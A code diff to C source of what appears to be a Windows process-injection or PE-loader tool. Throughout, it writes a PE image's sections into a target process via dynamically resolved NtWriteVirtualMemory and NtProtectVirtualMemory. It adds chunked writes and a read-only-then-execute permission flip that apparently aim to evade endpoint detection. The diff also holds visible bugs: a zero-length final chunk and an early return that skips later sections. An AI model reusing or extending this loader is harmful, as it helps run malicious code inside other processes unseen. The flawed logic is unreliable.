@@ -4,6 +4,8 @@
 #include <tlhelp32.h>
 #include <psapi.h>
 
+#define SIZE_CHUNK 9000
+
 
 _NtWriteVirtualMemory myNtWrite = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll"), "NtWriteVirtualMemory");
 _NtProtectVirtualMemory myNtProtec = (_NtProtectVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll"), "NtProtectVirtualMemory");
@@ -34,14 +36,25 @@ bool copyPEinTargetProcess(HANDLE pHandle, LPVOID allocAddrOnTarget, PPE_STRUCT 
 	_dbg("[+] Writing section into target process\r\n");
 	for (int i = 0; i < myPE->ntHeader->FileHeader.NumberOfSections; i++)
 	{
-		SIZE_T byteWritten = 0;
-		status = myNtWrite(pHandle, (LPVOID)((UINT64)allocAddrOnTarget + myPE->sections[i].header->VirtualAddress), myPE->sections[i].addrSection, myPE->sections[i].header->SizeOfRawData, &byteWritten);
-		if (status != 0)
+		if (!strcmp((PCHAR)myPE->sections[i].header->Name, ".reloc"))
+			continue;
+		DWORD numChunks = (myPE->sections[i].header->SizeOfRawData + SIZE_CHUNK - 1) / SIZE_CHUNK;
+		for (int chunkNum = 0; chunkNum < numChunks; chunkNum++)
 		{
-			_err("[-] ERROR: Cannot write section %s in the target process. ERROR Code: %x\r\n", (char*)myPE->sections[i].header->Name, status);
-			return FALSE;
+			SIZE_T byteWritten = 0;
+			DWORD sizeToWrite = SIZE_CHUNK;
+			if (chunkNum == (numChunks - 1))
+			{
+				sizeToWrite = myPE->sections[i].header->SizeOfRawData % SIZE_CHUNK;
+			}
+			status = myNtWrite(pHandle, (LPVOID)((UINT64)allocAddrOnTarget + myPE->sections[i].header->VirtualAddress + (SIZE_CHUNK*chunkNum)), (PVOID)((PBYTE)myPE->sections[i].addrSection+(SIZE_CHUNK * chunkNum)), sizeToWrite, &byteWritten);
+			if (status != 0)
+			{
+				_err("[-] ERROR: Cannot write section %s in the target process. ERROR Code: %x\r\n", (char*)myPE->sections[i].header->Name, status);
+				return FALSE;
+			}
+			_dbg("\t[+] Section %s written at : 0x%p.\n", (LPSTR)myPE->sections[i].header->Name, (LPVOID)((UINT64)allocAddrOnTarget + myPE->sections[i].header->VirtualAddress));
 		}
-		_dbg("\t[+] Section %s written at : 0x%p.\n", (LPSTR)myPE->sections[i].header->Name, (LPVOID)((UINT64)allocAddrOnTarget + myPE->sections[i].header->VirtualAddress));
 
 
 	}
@@ -652,6 +665,10 @@ BOOL FixMemPermissionsEx(IN HANDLE hProcess, IN ULONG_PTR pPeBaseAddress, IN PIM
 		DWORD	dwProtection = 0x00,
 			dwOldProtection = 0x00;
 
+		// Apply the determined memory protection to the section.
+		PVOID addr = (PBYTE)pPeBaseAddress + pImgSecHdr[i].VirtualAddress;
+		SIZE_T size = pImgSecHdr[i].SizeOfRawData;
+
 		// Skip the section if it has no data or no associated virtual address.
 		if (!pImgSecHdr[i].SizeOfRawData || !pImgSecHdr[i].VirtualAddress)
 			continue;
@@ -674,14 +691,28 @@ BOOL FixMemPermissionsEx(IN HANDLE hProcess, IN ULONG_PTR pPeBaseAddress, IN PIM
 			dwProtection = PAGE_EXECUTE_WRITECOPY;
 
 		if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
+		{
+			
+			dwProtection = PAGE_READONLY;
+			NTSTATUS status = myNtProtec(hProcess, &addr, (PULONG)&size, dwProtection, &dwOldProtection);
+			if (status != 0) {
+				_err("Failed changing permissions: %x\r\n", status);
+				return FALSE;
+			}
 			dwProtection = PAGE_EXECUTE_READ;
+			status = myNtProtec(hProcess, &addr, (PULONG)&size, dwProtection, &dwOldProtection);
+			if (status != 0) {
+				_err("Failed changing permissions: %x\r\n", status);
+				return FALSE;
+			}
+			return TRUE;
+		}
+			
 
 		if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
 			dwProtection = PAGE_EXECUTE_READWRITE;
 
-		// Apply the determined memory protection to the section.
-		PVOID addr = (PBYTE)pPeBaseAddress + pImgSecHdr[i].VirtualAddress;
-		SIZE_T size = pImgSecHdr[i].SizeOfRawData;
+
 		NTSTATUS status = myNtProtec(hProcess, &addr, (PULONG)&size, dwProtection, &dwOldProtection);
 		if (status != 0) {
 			_err("Failed changing permissions: %x\r\n",status);
